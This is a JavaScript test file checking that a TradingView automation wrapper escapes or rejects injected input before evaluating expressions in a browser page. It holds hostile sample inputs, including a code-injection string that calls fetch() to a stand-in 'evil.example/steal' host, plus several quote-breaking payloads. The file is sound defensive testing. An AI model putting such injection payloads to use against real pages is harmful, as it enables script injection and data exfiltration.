import test from "node:test";
import assert from "node:assert/strict";
import { TradingView } from "../../build/tradingview.js";

/** Fake CdpClient that records expressions instead of talking to a page. */
function fakeCdp(result = {}) {
  const calls = [];
  return {
    calls,
    evaluate(expression) {
      calls.push(expression);
      return Promise.resolve(result);
    },
  };
}

test("setSymbol embeds the symbol as a JSON string literal (no code injection)", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  const hostile = `BTC"); fetch("https://evil.example/steal"); ("`;
  await tv.setSymbol(hostile);

  const expr = cdp.calls[0];
  // the hostile payload must appear only in its escaped JSON form
  assert.ok(expr.includes(JSON.stringify(hostile)), "payload should be JSON-escaped");
  assert.ok(!expr.includes(`("${hostile}"`), "raw payload must not be spliced into code");
  // sanity: the escaped form neutralizes the quote that would break out of the literal
  assert.ok(!expr.includes(`BTC");`));
});

test("setResolution rejects strings that are not resolution-shaped", async () => {
  const tv = new TradingView(fakeCdp());
  for (const bad of ["", "1); hack(", "abc", "1D'; drop", "60m2"]) {
    assert.throws(() => tv.setResolution(bad), /resolution must look like/, bad);
  }
});

test("setResolution accepts typical TradingView resolutions", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D" });
  const tv = new TradingView(cdp);
  for (const ok of ["1", "5", "15", "60", "240", "1D", "1W", "1M", "D", "W"]) {
    await tv.setResolution(ok);
  }
  assert.equal(cdp.calls.length, 10);
});

test("setSymbol rejects empty input", () => {
  const tv = new TradingView(fakeCdp());
  assert.throws(() => tv.setSymbol(""), /non-empty/);
  assert.throws(() => tv.setSymbol("   "), /non-empty/);
});

test("getOhlcv validates count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getOhlcv(NaN), /count must be/);
  assert.throws(() => tv.getOhlcv(0), /count must be/);
  assert.throws(() => tv.getOhlcv(-5), /count must be/);
  assert.throws(() => tv.getOhlcv(Infinity), /count must be/);
  assert.throws(() => tv.getOhlcv(10, 1.5), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, -1), /chartIndex must be/);
  assert.throws(() => tv.getOhlcv(10, "1); hack("), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getOhlcv floors fractional counts and targets the right chart", async () => {
  const cdp = fakeCdp({ symbol: "X", resolution: "1D", count: 0, bars: [] });
  const tv = new TradingView(cdp);
  await tv.getOhlcv(10.9, 1);
  const expr = cdp.calls[0];
  assert.ok(expr.includes("slice(-10)"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");

  await tv.getOhlcv(5);
  assert.ok(cdp.calls[1].includes("api.activeChart()"), "default is active chart");
});

test("getIndicatorValues validates studyId, count and chartIndex before touching the page", () => {
  const cdp = fakeCdp();
  const tv = new TradingView(cdp);
  for (const badId of ['"); hack(); ("', "a b", "x".repeat(65), "évil", ""]) {
    assert.throws(() => tv.getIndicatorValues({ studyId: badId }), /studyId must match/, badId);
  }
  assert.throws(() => tv.getIndicatorValues({ count: 0 }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ count: NaN }), /count must be/);
  assert.throws(() => tv.getIndicatorValues({ chartIndex: -1 }), /chartIndex must be/);
  assert.equal(cdp.calls.length, 0, "no expression should reach the page");
});

test("getIndicatorValues embeds studyId as a JSON literal and honors options", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  await tv.getIndicatorValues({ studyId: "mlahPw", count: 5.9, chartIndex: 1, includeAllPlots: true });
  const expr = cdp.calls[0];
  assert.ok(expr.includes('"mlahPw"'), "studyId should be quoted");
  assert.ok(expr.includes("const maxBars = 5"), "fractional count should floor");
  assert.ok(expr.includes("api.chart(1)"), "should target chart 1");
  assert.ok(expr.includes("const includeAllPlots = true"));

  await tv.getIndicatorValues();
  const expr2 = cdp.calls[1];
  assert.ok(expr2.includes("const studyIdFilter = null"), "default is all studies");
  assert.ok(expr2.includes("api.activeChart()"), "default is active chart");
  assert.ok(expr2.includes("const includeAllPlots = false"));
});

test("getIndicatorInputs validates ids and always excludes Pine-internal inputs", async () => {
  const cdp = fakeCdp([]);
  const tv = new TradingView(cdp);
  assert.throws(() => tv.getIndicatorInputs({ studyId: '1"; steal()' }), /studyId must match/);
  assert.equal(cdp.calls.length, 0);

  await tv.getIndicatorInputs({ studyId: "XfUjdm" });
  const expr = cdp.calls[0];
  for (const hidden of ["text", "pineId", "pineVersion", "pineFeatures"]) {
    assert.ok(expr.includes(`"${hidden}"`), `HIDDEN set must contain ${hidden}`);
  }
  assert.ok(expr.includes("truncated"), "long string values must be truncated");
});

test("getChartContext returns the page value as-is", async () => {
  const ctx = { layoutName: "L", activeChartIndex: 0, chartsCount: 1, charts: [] };
  const tv = new TradingView(fakeCdp(ctx));
  assert.deepEqual(await tv.getChartContext(), ctx);
});
